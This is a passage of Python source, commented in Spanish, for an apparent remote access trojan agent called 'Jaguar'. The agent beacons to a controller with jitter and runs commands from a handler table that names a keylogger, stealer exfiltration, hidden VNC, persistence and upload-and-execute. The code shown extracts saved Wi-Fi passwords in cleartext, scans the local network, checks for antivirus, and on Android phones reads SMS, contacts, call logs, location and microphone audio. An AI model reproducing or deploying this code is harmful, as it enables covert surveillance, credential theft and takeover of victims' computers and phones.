        return {"salida": _cmd_out("net user")}
    return {"salida": _cmd_out("cut -d: -f1,3 /etc/passwd; echo; who")}


def _net_view(a):
    if ES_WIN:
        return {"salida": _cmd_out("net view")}
    return {"salida": _cmd_out("smbclient -L localhost -N 2>/dev/null || "
                               "showmount -e localhost 2>/dev/null")}


def _schtasks_list(a):
    if ES_WIN:
        return {"salida": _cmd_out("schtasks /query /fo LIST")}
    return {"salida": _cmd_out("crontab -l 2>/dev/null; echo ---; "
                               "systemctl list-timers --no-pager 2>/dev/null")}


def _drives(a):
    return {"salida": _cmd_out("wmic logicaldisk get name,size,freespace,volumename"
                               if ES_WIN else "df -h")}


def _env(a):
    return {"salida": "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))}


def _wmi(a):
    if ES_WIN:
        return {"salida": _ps("Get-CimInstance Win32_ComputerSystem | Format-List *")}
    if ES_ANDROID:
        return {"salida": _cmd_out("getprop | head -80; echo; cat /proc/cpuinfo | "
                                   "head -30")}
    return {"salida": _cmd_out("lscpu; echo; free -h; echo; lsblk; echo; "
                               "cat /sys/class/dmi/id/product_name 2>/dev/null")}


def _powershell(a):
    return {"salida": _ps(a.get("comando", ""))}


def _privilegios(a):
    if ES_WIN:
        return {"salida": _cmd_out("whoami /priv")}
    if ES_ANDROID:
        return {"salida": _root_cmd("id") if _es_root_android() else "sin root"}
    return {"salida": _cmd_out("id; echo ---; sudo -n -l 2>/dev/null; echo ---; "
                               "ls -l /etc/sudoers.d 2>/dev/null")}


def _av(a):
    if ES_ANDROID:
        return {"salida": _cmd_out("getprop | grep -iE 'av|antivirus'")}
    if not ES_WIN:
        lineas = []
        for cmd, etq in ((_cmd_out("systemctl is-active ufw"), "ufw"),
                         (_cmd_out("systemctl is-active firewalld"), "firewalld"),
                         (_cmd_out("pgrep -a clamd"), "clamav"),
                         (_cmd_out("which apparmor_status && apparmor_status | head -5"),
                          "apparmor"),
                         (_cmd_out("which getenforce && getenforce"), "selinux")):
            if cmd and "[error]" not in cmd:
                lineas.append(f"{etq}: {cmd.strip()[:200]}")
        return {"salida": "\n".join(lineas) or "(sin AV/EDR detectado)"}
    salida = _ps("Get-MpComputerStatus | Select AMServiceEnabled,AntivirusEnabled,"
                 "RealTimeProtectionEnabled | Format-List")
    if not salida or "Get-MpComputerStatus" in salida:
        salida = _cmd_out('wmic /namespace:\\\\root\\SecurityCenter2 path '
                          'AntiVirusProduct get displayName,productState /format:list')
    return {"salida": salida or "(sin AV reportado)"}


def _uac(a):
    if ES_WIN:
        return {"salida": _cmd_out(r"reg query HKLM\SOFTWARE\Microsoft\Windows"
                                   r"\CurrentVersion\Policies\System")}
    return {"salida": _cmd_out("cat /etc/sudoers 2>/dev/null | grep -v '^#'; "
                               "echo ---; getent group sudo wheel adm")}


def _wifi_perfiles(a):
    if ES_ANDROID:
        d = _tx_json("termux-wifi-connectioninfo")
        lineas = []
        if d:
            lineas.append(f"{d.get('ssid', '?')}  ->  (conectado)")
        ok, txt = _tx("termux-wifi-scaninfo", timeout=25)
        if txt:
            try:
                for ap in json.loads(txt):
                    lineas.append(f"{ap.get('ssid', '?')}  ->  {ap.get('bssid', '')}")
            except Exception:
                lineas.append(txt[:500])
        return {"salida": "\n".join(lineas) or "(sin datos)"}
    if ES_WIN:
        nombres = []
        for ln in _cmd_out("netsh wlan show profiles").splitlines():
            low = ln.lower()
            if ":" in ln and ("perfil" in low or "profile" in low):
                nombres.append(ln.split(":", 1)[1].strip())
        lineas = []
        for n in nombres:
            det = _cmd_out(f'netsh wlan show profile name="{n}" key=clear')
            clave = ""
            for ln in det.splitlines():
                low = ln.lower()
                if ":" in ln and ("clave" in low or "key content" in low):
                    clave = ln.split(":", 1)[1].strip()
                    break
            lineas.append(f"{n}  ->  {clave or '(sin clave)'}")
        return {"salida": "\n".join(lineas) or "(sin perfiles)"}
    lineas = []
    for d in ("/etc/NetworkManager/system-connections",
              os.path.join(_HOME, ".config", "NetworkManager",
                           "system-connections")):
        if not os.path.isdir(d):
            continue
        for archivo in os.listdir(d):
            try:
                with open(os.path.join(d, archivo), encoding="utf-8",
                          errors="replace") as f:
                    txt = f.read()
                ssid = psk = ""
                for ln in txt.splitlines():
                    if ln.startswith("ssid="):
                        ssid = ln.split("=", 1)[1].strip()
                    elif ln.startswith("psk="):
                        psk = ln.split("=", 1)[1].strip()
                if ssid:
                    lineas.append(f"{ssid}  ->  {psk or '(sin clave)'}")
            except Exception:
                continue
    if not lineas and _tiene("nmcli"):
        lineas = [_cmd_out("nmcli -f NAME,PASSWORD dev wifi list")]
    return {"salida": "\n".join(lineas) or "(sin perfiles / usa root)"}


def _portscan(a):
    import ipaddress
    from concurrent.futures import ThreadPoolExecutor
    base = a.get("objetivo") or _ip_interna()
    try:
        red = ipaddress.ip_network(str(base) + "/24", strict=False)
        hosts = [str(h) for h in red.hosts()]
    except Exception:
        hosts = [str(base)]
    puertos = a.get("puertos") or [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443,
                                   445, 1433, 1521, 3306, 3389, 5432, 5900, 6379,
                                   8080, 8443, 9200, 27017]
    abiertos = []

    def _p(par):
        ip, pt = par
        s = socket.socket()
        s.settimeout(0.5)
        try:
            if s.connect_ex((ip, pt)) == 0:
                return f"{ip}:{pt}"
        except Exception:
            return None
        finally:
            s.close()
        return None

    with ThreadPoolExecutor(max_workers=128) as ex:
        for r in ex.map(_p, [(ip, pt) for ip in hosts for pt in puertos]):
            if r:
                abiertos.append(r)
    return {"objetivo": base, "abiertos": sorted(abiertos)}


def _recon_full(a):
    return {
        "equipo": _sysinfo(),
        "usuario": _cmd_out("whoami /all" if ES_WIN else "id; echo; groups"),
        "av": _av({})["salida"],
        "uac": _uac({})["salida"],
        "red": _ipconfig({})["salida"],
        "puertos": _netstat({})["salida"],
        "arp": _arp({})["salida"],
        "rutas": _cmd_out("route print" if ES_WIN else "ip route"),
        "admins": _cmd_out("net localgroup administrators" if ES_WIN
                           else "getent group sudo adm wheel"),
        "sesiones": _cmd_out("query user" if ES_WIN else "who; w"),
        "servicios": (_ps("Get-Service | Where-Object {$_.Status -eq 'Running'} | "
                          "Select Name,DisplayName | Format-Table -Auto") if ES_WIN
                      else _cmd_out("systemctl list-units --type=service "
                                    "--state=running --no-pager 2>/dev/null")),
        "tareas": _schtasks_list({})["salida"],
        "hotfixes": (_ps("Get-HotFix | Select HotFixID,InstalledOn | Format-Table -Auto")
                     if ES_WIN else _cmd_out("uname -a; cat /etc/os-release")),
        "wifi": _wifi_perfiles({})["salida"],
        "discos": _drives({})["salida"],
    }


# ===========================================================================
#  MODULO MOVIL (Android / Termux)
# ===========================================================================
def _movil_info(a):
    d = _android_info()
    d["ip"] = _ip_interna()
    b = _tx_json("termux-battery-status")
    if b:
        d["bateria"] = b
    try:
        r = subprocess.run(["df", "-h", _HOME], capture_output=True, text=True,
                           timeout=10)
        lineas = (r.stdout or "").strip().splitlines()
        if len(lineas) > 1:
            d["almacenamiento"] = " ".join(lineas[1].split()[1:4])
    except Exception:
        pass
    d["caps_movil"] = True
    return d


def _movil_pantalla(a):
    return _captura_android("jpeg", int(a.get("calidad", 70)),
                            float(a.get("escala", 1.0)) or 1.0)


def _movil_tap(a):
    x, y = int(a.get("x", 0)), int(a.get("y", 0))
    _root_cmd(f"input tap {x} {y}", timeout=12)
    return {"estado": f"tap {x},{y}"}


def _movil_swipe(a):
    _root_cmd(f"input swipe {int(a.get('x1', 0))} {int(a.get('y1', 0))} "
              f"{int(a.get('x2', 0))} {int(a.get('y2', 0))} {int(a.get('ms', 300))}",
              timeout=15)
    return {"estado": "swipe"}


def _movil_texto(a):
    txt = str(a.get("texto", "")).replace(" ", "%s")
    _root_cmd(f"input text '{txt}'", timeout=15)
    return {"estado": "texto"}


def _movil_tecla(a):
    _root_cmd(f"input keyevent {int(a.get('code', 4))}", timeout=12)
    return {"estado": "tecla"}


def _movil_camara(a):
    return _webcam({"cam": int(a.get("cam", 0))})


def _movil_mic(a):
    seg = max(2, min(120, int(a.get("segundos", 10))))
    destino = os.path.join(_HOME, ".jaguar_mic.m4a")
    _tx("termux-microphone-record", "-f", destino, "-l", str(seg), timeout=seg + 15)
    time.sleep(seg + 1)
    _tx("termux-microphone-record", "-q", timeout=10)
    try:
        with open(destino, "rb") as f:
            raw = f.read()
        os.remove(destino)
    except Exception as e:
        return {"error": str(e), "b64": ""}
    return {"b64": base64.b64encode(raw).decode(), "segundos": seg,
            "tamano": len(raw)}


def _movil_sms(a):
    d = _tx_json("termux-sms-list", "-l", str(int(a.get("limite", 50))))
    if d is None:
        return {"error": "termux-api no instalado (pkg install termux-api)",
                "lista": []}
    lista = []
    for s in d:
        lista.append({"numero": s.get("number", ""),
                      "fecha": time.strftime("%Y-%m-%d %H:%M",
                                             time.localtime(s.get("received", 0))),
                      "tipo": s.get("type", ""),
                      "texto": s.get("body", "")})
    return {"lista": lista}


def _movil_sms_enviar(a):
    ok, txt = _tx("termux-sms-send", "-n", str(a.get("numero", "")),
                  str(a.get("texto", "")), timeout=30)
    return {"ok": ok, "salida": txt}


def _movil_contactos(a):
    d = _tx_json("termux-contact-list")
    if d is None:
        return {"error": "termux-api no instalado", "lista": []}
    lista = []
    for c in d:
        lista.append({"nombre": c.get("name", ""),
                      "numeros": [c.get("number", "")] if c.get("number") else []})
    return {"lista": lista}


def _movil_llamadas(a):
    d = _tx_json("termux-call-log", "-l", str(int(a.get("limite", 50))))
    if d is None:
        return {"error": "termux-api no instalado", "lista": []}
    tipos = {"1": "IN", "2": "OUT", "3": "PERDIDA", "4": "VOZ", "5": "RECHAZADA",
             "6": "BLOQUEADA"}
    lista = []
    for c in d:
        lista.append({"numero": c.get("phone_number", ""),
                      "fecha": time.strftime("%Y-%m-%d %H:%M",
                                             time.localtime(c.get("date", 0))),
                      "duracion": c.get("duration", ""),
                      "tipo": tipos.get(str(c.get("type", "")), c.get("type", ""))})
    return {"lista": lista}


def _movil_ubicacion(a):
    d = _tx_json("termux-location")
    return d or {"error": "termux-api no instalado"}


def _movil_sensores(a):
    if a.get("listar"):
        ok, txt = _tx("termux-sensor", "-l", timeout=20)
        return {"salida": txt}
    nombre = a.get("nombre") or "accelerometer"
    ok, txt = _tx("termux-sensor", "-s", nombre, "-n", "1", timeout=20)
    return {"salida": txt, "sensor": nombre}


def _movil_bateria(a):
    d = _tx_json("termux-battery-status")
    return d or {"error": "termux-api no instalado"}


def _movil_almacenamiento(a):
    return {"salida": _cmd_out("df -h | head -20")}


def _movil_wifi(a):
    d = _tx_json("termux-wifi-connectioninfo")
    return d or {"error": "termux-api no instalado"}


def _movil_wifi_scan(a):
    d = _tx_json("termux-wifi-scaninfo")
    return {"lista": d or [], "error": None if d else "termux-api no instalado"}


def _movil_telefonia(a):
    d = _tx_json("termux-telephony-deviceinfo")
    return d or {"error": "termux-api no instalado"}


def _movil_procesos(a):
    return {"salida": _cmd_out("ps -A -o PID,USER,NAME 2>/dev/null || ps aux")}


def _movil_cuentas(a):
    return {"salida": _cmd_out("dumpsys account 2>/dev/null | head -40 || "
                               "cmd account list 2>/dev/null")}


def _movil_notif_list(a):
    ok, txt = _tx("termux-notification-list", timeout=20)
    try:
        return {"lista": json.loads(txt)}
    except Exception:
        return {"salida": txt[:3000]}


def _movil_clip_get(a):
    return _clip_get(a)


def _movil_clip_set(a):
    return _clip_set(a)


def _movil_notificar(a):
    ok, txt = _tx("termux-notification", "--title", str(a.get("titulo", "Jaguar")),
                  "--content", str(a.get("texto", "")), timeout=15)
    return {"ok": ok, "salida": txt}


def _movil_toast(a):
    ok, txt = _tx("termux-toast", str(a.get("texto", "")), timeout=15)
    return {"ok": ok, "salida": txt}


def _movil_tts(a):
    ok, txt = _tx("termux-tts-speak", str(a.get("texto", "")), timeout=20)
    return {"ok": ok, "salida": txt}


def _movil_vibrar(a):
    ok, txt = _tx("termux-vibrate", "-d", str(int(a.get("ms", 1000))), timeout=15)
    return {"ok": ok, "salida": txt}


def _movil_linterna(a):
    ok, txt = _tx("termux-torch", "on", timeout=15)
    time.sleep(1)
    _tx("termux-torch", "off", timeout=15)
    return {"ok": ok, "salida": txt or "torch on/off"}


def _movil_fondo(a):
    ruta = a.get("ruta")
    if ruta and os.path.isfile(ruta):
        ok, txt = _tx("termux-wallpaper", "-f", ruta, timeout=20)
        return {"ok": ok, "salida": txt}
    return {"error": "falta ruta de imagen"}


def _movil_huella(a):
    ok, txt = _tx("termux-fingerprint", timeout=40)
    return {"ok": ok, "salida": txt}


def _movil_dialogo(a):
    ok, txt = _tx("termux-dialog", "text", "-t", str(a.get("titulo", "Jaguar")),
                  timeout=60)
    return {"ok": ok, "salida": txt}


def _movil_media(a):
    ok, txt = _tx("termux-media-player", "play", timeout=15)
    time.sleep(1)
    _tx("termux-media-player", "pause", timeout=15)
    return {"ok": ok, "salida": txt}


def _movil_volumen(a):
    ok, txt = _tx("termux-volume", "music", "15", timeout=15)
    return {"ok": ok, "salida": txt}


def _movil_apps(a):
    flag = "-3" if a.get("tipo", "usuario") == "usuario" else ""
    salida = _root_cmd(f"pm list packages {flag}".strip(), timeout=40)
    lista = [l.replace("package:", "").strip() for l in salida.splitlines()
             if l.startswith("package:")]
    return {"lista": sorted(lista)}


def _movil_app_abrir(a):
    pkg = a.get("paquete", "")
    return {"salida": _root_cmd(
        f"monkey -p {pkg} -c android.intent.category.LAUNCHER 1", timeout=25)}


def _movil_app_matar(a):
    return {"salida": _root_cmd(f"am force-stop {a.get('paquete', '')}", timeout=25)}


def _movil_root(a):
    r = _es_root_android()
    return {"root": r, "salida": _root_cmd("id") if r else "sin root"}


def _movil_persistir(a):
    return _persistir(a)


# ===========================================================================
#  Registro de handlers
# ===========================================================================
HANDLERS = {
    "ping": _ping, "shell": _shell, "sysinfo": lambda a: _sysinfo(),
    "listar_dir": _listar_dir, "procesos": _procesos, "captura": _captura,
    "raton": _raton, "swap_raton": _swap_raton, "teclado": _teclado,
    "webcam": _webcam, "webcam_iniciar": _webcam_iniciar,
    "webcam_frame": _webcam_frame, "webcam_parar": _webcam_parar,
    "keylogger_iniciar": _keylogger_iniciar, "keylogger_leer": _keylogger_leer,
    "persistir": _persistir, "abrir_url": _abrir_url, "mensaje": _mensaje,
    "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
    "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
    "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar,
    "hvnc_navegar": _hvnc_navegar, "hvnc_estado": _hvnc_estado,
    "hvnc_opciones": _hvnc_opciones, "log": _log_leer,
    "hvnc_captura": _hvnc_captura, "hvnc_raton": _hvnc_raton,
    "hvnc_teclado": _hvnc_teclado, "hvnc_stream": _hvnc_stream,
    "captura_stream": _captura_stream, "bloquear_entrada": _bloquear,
    "clip_get": _clip_get, "clip_set": _clip_set, "desconectar": _desconectar,
    "stealer_recolectar": _stealer_recolectar, "stealer_estado": _stealer_estado,
    "stealer_paquete": _stealer_paquete, "stealer_exfil": _stealer_exfil,
    "stealer_auto": _stealer_auto,
    "whoami": _whoami, "netstat": _netstat, "arp": _arp, "ipconfig": _ipconfig,
    "tasklist": _tasklist, "net_user": _net_user, "net_view": _net_view,
    "schtasks_list": _schtasks_list, "drives": _drives, "env": _env, "wmi": _wmi,
    "powershell": _powershell, "spawn": _spawn, "portscan": _portscan,
    "energia": _energia, "recon_full": _recon_full,
    "wifi_perfiles": _wifi_perfiles, "privilegios": _privilegios,
    "beacon_kill": _beacon_kill, "beacon_reconectar": _beacon_reconectar,
    "caps": lambda a: {"so": SO, "caps": CAPS},
    # --- movil (Android / Termux) ---
    "movil_info": _movil_info, "movil_pantalla": _movil_pantalla,
    "movil_tap": _movil_tap, "movil_swipe": _movil_swipe,
    "movil_texto": _movil_texto, "movil_tecla": _movil_tecla,
    "movil_camara": _movil_camara, "movil_mic": _movil_mic,
    "movil_sms": _movil_sms, "movil_sms_enviar": _movil_sms_enviar,
    "movil_contactos": _movil_contactos, "movil_llamadas": _movil_llamadas,
    "movil_ubicacion": _movil_ubicacion, "movil_sensores": _movil_sensores,
    "movil_bateria": _movil_bateria, "movil_almacenamiento": _movil_almacenamiento,
    "movil_wifi": _movil_wifi, "movil_wifi_scan": _movil_wifi_scan,
    "movil_telefonia": _movil_telefonia, "movil_procesos": _movil_procesos,
    "movil_cuentas": _movil_cuentas, "movil_notif_list": _movil_notif_list,
    "movil_clip_get": _movil_clip_get, "movil_clip_set": _movil_clip_set,
    "movil_notificar": _movil_notificar, "movil_toast": _movil_toast,
    "movil_tts": _movil_tts, "movil_vibrar": _movil_vibrar,
    "movil_linterna": _movil_linterna, "movil_fondo": _movil_fondo,
    "movil_huella": _movil_huella, "movil_dialogo": _movil_dialogo,
    "movil_media": _movil_media, "movil_volumen": _movil_volumen,
    "movil_apps": _movil_apps, "movil_app_abrir": _movil_app_abrir,
    "movil_app_matar": _movil_app_matar, "movil_root": _movil_root,
    "movil_persistir": _movil_persistir,
}

_RUIDO = ("ping", "raton", "teclado", "hvnc_captura", "hvnc_raton",
          "hvnc_teclado", "hvnc_stream", "captura_stream", "webcam_frame",
          "captura", "hvnc_estado", "movil_pantalla")


def _bucle(sock):
    global SLEEP, JITTER
    while True:
        msg = _recibir(sock)
        if msg is None:
            return
        t = msg.get("tipo")
        if t == "beacon":
            SLEEP = float(msg.get("sleep", SLEEP))
            JITTER = float(msg.get("jitter", 0)) / 100.0
            _log("BEACON", f"sleep={SLEEP} jitter={JITTER}")
            continue
        if t != "comando":
            continue
        cmd = msg.get("cmd")
        if cmd not in _RUIDO:
            _log("CMD", cmd)
        fn = HANDLERS.get(cmd)
        try:
            datos = fn(msg.get("args") or {}) if fn else {"error": "cmd desconocido"}
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": True, "datos": datos})
        except Exception as e:
            _log("ERROR", f"{cmd}: {e}")
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": False,
                           "error": str(e)})
        if _SALIR:
            os._exit(0)


def _intentar(h, puerto, timeout):
    try:
        s = socket.create_connection((h, puerto), timeout=timeout)
        s.settimeout(None)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
        except Exception:
            pass
        return s
    except Exception:
        return None


def _conectar(objetivos, puerto, timeout=5.0):
    logrados = {}

    def _w(h):
        s = _intentar(h, puerto, timeout)
        if s is not None:
            logrados[h] = s

    hilos = [threading.Thread(target=_w, args=(h,), daemon=True) for h in objetivos]
    for t in hilos:
        t.start()
    fin = time.time() + timeout + 1.0
    while not logrados and time.time() < fin:
        time.sleep(0.05)
    if not logrados:
        return None
    _, s = next(iter(logrados.items()))
    for h2, s2 in logrados.items():
        if s2 is not s:
            try:
                s2.close()
            except Exception:
                pass
    return s


def main():
    host, puerto, fb = _cfg()
    objetivos = []
    for h in (host, fb, "127.0.0.1"):
        if h and h not in objetivos:
            objetivos.append(h)
    _log("AGENTE", f"inicio pid={os.getpid()} so={SO} caps={sorted(CAPS)}")
    while True:
        s = _conectar(objetivos, puerto, timeout=5.0)
        if s is not None:
            _SOCK_ACT["s"] = s
            try:
                _enviar(s, {"tipo": "hola", "info": _sysinfo()})
                _log("AGENTE", "conectado al controlador")
                threading.Thread(target=_hilo_latido, args=(s,), daemon=True).start()
                _bucle(s)
                _log("AGENTE", "desconectado")
            except SystemExit:
                return
            except Exception as e:
                _log("AGENTE", f"error de sesion: {e}")
            finally:
                _SOCK_ACT["s"] = None
            try:
                s.close()
            except Exception:
                pass
        time.sleep(SLEEP * (1 + random.uniform(-JITTER, JITTER)))


if __name__ == "__main__":
    main()